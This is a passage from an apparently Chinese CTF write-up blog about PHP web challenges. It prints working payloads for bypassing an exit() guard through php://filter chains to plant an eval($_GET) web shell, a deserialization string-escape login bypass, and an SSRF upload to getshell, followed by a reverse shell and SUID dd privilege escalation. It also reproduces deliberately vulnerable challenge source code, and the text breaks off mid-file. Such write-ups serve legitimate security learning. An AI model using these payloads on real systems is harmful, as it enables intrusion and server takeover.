class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;waf.php&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-variable">$chars </span>= <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">mt_rand</span>(), <span class="hljs-literal">true</span>));  <br>    <span class="hljs-variable">$uuid </span>= <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span> <br>            . <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr </span>( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> );  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid </span>;  <br>&#125;  <br><span class="hljs-variable">$safe_header </span>= <span class="hljs-string">&#x27;&lt;?php exit();?&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;path&#x27;</span>,<span class="hljs-title function_ invoke__">uuid</span>());<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$path </span>= <span class="hljs-string">&#x27;./upload/&#x27;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>].<span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$path</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">0755</span>);<br>&#125;<br><span class="hljs-variable">$file_data </span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-variable">$filename </span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;/tmp/&#x27;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>],<span class="hljs-variable">$file_data</span>);<br>    <span class="hljs-variable">$file_type </span>= <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-string">&#x27;/tmp/&#x27;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type </span>!= <span class="hljs-string">&quot;GIF&quot;</span> &amp;&amp; <span class="hljs-variable">$file_type </span>!= <span class="hljs-string">&quot;PNG&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I need data&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$safe_header</span>.<span class="hljs-variable">$file_data</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I need name&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>典型的死亡exit绕过，又加了一个exif_imagetype的文件类型检测</p><p>可以使用filter的base64+string.strip_tags绕过，string.strip_tags先去除exit，base64decode再写入一句话（一句话也是php代码，所以需要先base64编码绕过string.strip_tags，再base64解码变回原来的内容），需要注意还有一个文件类型检测，可以使用文件头GIF89a绕过，但是这样的话GIF89a放在base64编码之前（文件类型的检测在写入文件之前），就会对base64解码造成影响。于是就需要根据base64的编解码原则，填充字符，使后面的php代码解码不被影响。</p><p>如果不能成功解码，则会</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004060.png" alt="image-20221121144538306"></p><p>如果php代码被杂糅也不行，失去作用了。</p><p>以写入phpinfo代码为例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br>PD9waHAgcGhwaW5mbygpOz8+<br></code></pre></td></tr></table></figure><p>在前面加入GIF89a</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">GIF89aPD9waHAgcGhwaW5mbygpOz8+<br></code></pre></td></tr></table></figure><p>长度为30，Base64以4byte为一组，所以直接解码是解码不出来的</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004061.png" alt="image-20221121145343490"></p><p>为了不破坏imagetype的识别，使后面的编码能成功解码，最好的填充位置就是GIF89a和php代码的base64之间，填充两个字符即可，GIF89a11，八个字符，不会影响后面的编码</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">data=GIF89a11PD89ZXZhbCgkX0dFVFswXSk7&amp;filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.strip_tags|convert.base64-decode/</span>resource=.<span class="hljs-regexp">/upload/</span><span class="hljs-number">996</span>/<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure><p>base64解码后就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a11PD89ZXZhbCgkX0dFVFswXSk7<br>�|��u<span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004062.png" alt="image-20221121152652460"></p><h2 id="uploadrce"><a href="#uploadrce" class="headerlink" title="uploadrce"></a>uploadrce</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004063.png" alt="image-20221121152640694"></p><p>dirsearch发现两个swp文件，使用vim -r 恢复</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> -r <span class="hljs-built_in">index</span>.php.swp<br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;option&#x27;</span>])) <span class="hljs-keyword">die</span>();<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;option&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$str</span> != <span class="hljs-literal">NULL</span>)&#123;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;:Where is the source code of config.php?&#x27;</span>;<br>   &#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="hljs-string">&quot;\$option=&#x27;<span class="hljs-subst">$str</span>&#x27;;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>, <span class="hljs-variable">$file</span>);<br><br></code></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;chinfo&#x27;</span>;<br></code></pre></td></tr></table></figure><p>可参考p神的正则经典漏洞</p><h2 id="Loginintomyheart"><a href="#Loginintomyheart" class="headerlink" title="Loginintomyheart"></a>Loginintomyheart</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004064.png" alt="image-20221122221448066"></p><p>loginfo.php</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">你的登录凭证为：TzozOiJMb<span class="hljs-number">2</span>ciOj<span class="hljs-name">M6</span>e<span class="hljs-number">3</span><span class="hljs-name">M6</span>ODoicGFzc<span class="hljs-number">3</span>d<span class="hljs-attr">vcmQiO3</span><span class="hljs-name">M6</span>MzI<span class="hljs-number">6</span>ImQ<span class="hljs-number">0</span>MWQ<span class="hljs-number">4</span>Y<span class="hljs-number">2</span>Q<span class="hljs-number">5</span>OGYwMGIyMDRlOTgwMDk<span class="hljs-number">5</span>OGVjZj<span class="hljs-name">g0</span>MjdlIjtzOj<span class="hljs-name">g6</span>I<span class="hljs-symbol">nVzZXJuYW1</span>lIjtO<span class="hljs-meta">O3</span><span class="hljs-name">M6</span><span class="hljs-symbol">NzoiaXNsb2</span>dpbiI<span class="hljs-number">7</span>aTow<span class="hljs-meta">O30</span>=<br></code></pre></td></tr></table></figure><p>admin&#x2F;admin</p><p>O:3:”Log”:3:{s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:8:”username”;s:5:”hacker”;s:7:”islogin”;i:0;}</p><p>VanZY&#x2F;123456</p><p>O:3:”Log”:3:{s:8:”password”;s:32:”276f722736c95d99e921722cf9ed621c”;s:8:”username”;s:5:”VanZY”;s:7:”islogin”;i:0;}</p><p>发现admin被替换为hacker</p><p>5–&gt;6</p><p>正是之前提到的反序列化字符逃逸</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;islogin&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>21字符</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;islogin&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;islogin&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004065.png" alt="image-20221122230521380"></p><p>SYC{5Yir5b2T6IiU54uX5LqG5aW95ZCXW&#x2F;CfmIVd77yM55yf6Jm+5aS0}</p><p>别当舔狗了好吗[😅]，真虾头</p><h2 id="edit-php（赛后）"><a href="#edit-php（赛后）" class="headerlink" title="edit_php（赛后）"></a>edit_php（赛后）</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004066.png" alt="image-20221122231101304"></p><p>第一次创建目录的时候可以看到&#x2F;catchImg.php?file_url&#x3D;example.jpg</p><p>随便输入一个文件名，</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004068.png" alt="image-20221122233134448"></p><p>后面发现可以读取远程文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file_url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/showImage.php<br></code></pre></td></tr></table></figure><p>可惜的是名字不可控，md5加密了。</p><h3 id="赛后复现"><a href="#赛后复现" class="headerlink" title="赛后复现"></a>赛后复现</h3><p>类似于Ueditor的任意文件上传，采用</p><p>127.0.0.1&#x2F;shell.jpg?.php</p><p>使文件保存时解析为php文件</p><p>首先在VPS上放一个图片马，接着</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">49.235</span>.<span class="hljs-number">109.5</span>:<span class="hljs-number">8302</span><span class="hljs-regexp">/catchImg.php?file_url=http:/</span><span class="hljs-regexp">/127.0.0.1/</span>shell.jpg?.php<br></code></pre></td></tr></table></figure><p>接着在<a href="http://49.235.109.5:8302/showImage.php%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%9B%BE%E7%89%87%E9%A9%AC%E7%9A%84%E8%B7%AF%E5%BE%84">http://49.235.109.5:8302/showImage.php可以看到图片马的路径</a></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004069.png" alt="image-20221127154158916"></p><p>直接getshell</p><p>flag在根目录</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004070.png" alt="image-20221127155113827"></p><p>但是直接读取读取不上，可能权限不够，反弹shell看看</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004071.png" alt="image-20221127161117042"></p><p>权限不够，SUID提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004072.png" alt="image-20221127161206455"></p><p>发现dd有suid权限，使用此命令读取flag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=f1ag_is_here_y0u_k0nw <span class="hljs-attribute">of</span>=/flag<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004073.png" alt="image-20221127161317696"></p><p>成功读取出flag。</p><h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;div align=<span class="hljs-string">&quot;center&quot;</span>&gt;<br>    &lt;img src=<span class="hljs-string">&quot;./img/SYC.jpg&quot;</span> width=<span class="hljs-string">&quot;600&quot;</span> height=<span class="hljs-string">&quot;400&quot;</span> &gt;<br>&lt;/div&gt;<br>&lt;h2&gt;&lt;a href=<span class="hljs-string">&#x27;/setCookie.php&#x27;</span> align=<span class="hljs-string">&quot;center&quot;</span>&gt;创建/进入你的私人相册&lt;/a&gt;&lt;/h2&gt;<br></code></pre></td></tr></table></figure><p>photo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;title&gt;<span class="hljs-number">3</span>dPhoto&lt;/title&gt;<br>&lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;./photo.css&quot;</span>/&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">show</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">box</span>&quot;&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span> </span><br><span class="hljs-class">$<span class="hljs-title">path</span> = $<span class="hljs-title">_COOKIE</span>[&#x27;<span class="hljs-title">path</span>&#x27;];</span><br><span class="hljs-class">$<span class="hljs-title">dirArr</span> = <span class="hljs-title">scandir</span>(&#x27;./<span class="hljs-title">upload</span>/&#x27;.$<span class="hljs-title">path</span>.&#x27;/&#x27;);</span><br><span class="hljs-class"><span class="hljs-title">foreach</span>($<span class="hljs-title">dirArr</span> <span class="hljs-title">as</span> $<span class="hljs-title">f</span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$f</span> !== <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$f</span> !== <span class="hljs-string">&#x27;..&#x27;</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-string">&#x27;./upload/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$f</span>.<span class="hljs-string">&quot;\&quot; &gt;&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/div&gt;<br>&lt;/div&gt;<br>        &lt;h3&gt;<br>        &lt;/h3&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>showimage.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>].<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;example&#x27;</span>).<span class="hljs-string">&quot;.jpg&quot;</span>))&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;photo.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=&#x27;center&#x27;&gt;&lt;a href=&#x27;/catchImg.php?file_url=example.jpg&#x27;&gt;获取实例图片&lt;/a&gt;&lt;/h2&gt;&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>setCookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-variable">$chars</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">mt_rand</span>(), <span class="hljs-literal">true</span>));  <br>    <span class="hljs-variable">$uuid</span> = <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span> <br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> ); <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid</span> ;  <br>&#125;  <br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;path&#x27;</span>,<span class="hljs-title function_ invoke__">uuid</span>());<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;refresh: 2;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;创建成功&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:/showImage.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>catchImg.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /index.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$path</span>))&#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$path</span>,<span class="hljs-number">0755</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">5</span>);<br>        <span class="hljs-variable">$checklist</span> = [<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>];<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$checklist</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$uri</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>]);<br>            <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>], <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>], <span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$uri</span> !== <span class="hljs-string">&quot;&quot;</span>)&#123;<br>                <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&#x27;/&#x27;</span>)?<span class="hljs-number">0</span>:<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&#x27;.&#x27;</span>)-(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&#x27;/&#x27;</span>)?<span class="hljs-number">0</span>:<span class="hljs-number">1</span>));<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file_name</span>).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$contents</span>);<br>            &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no resource!&quot;</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /index.php&quot;</span>);<br>        <span 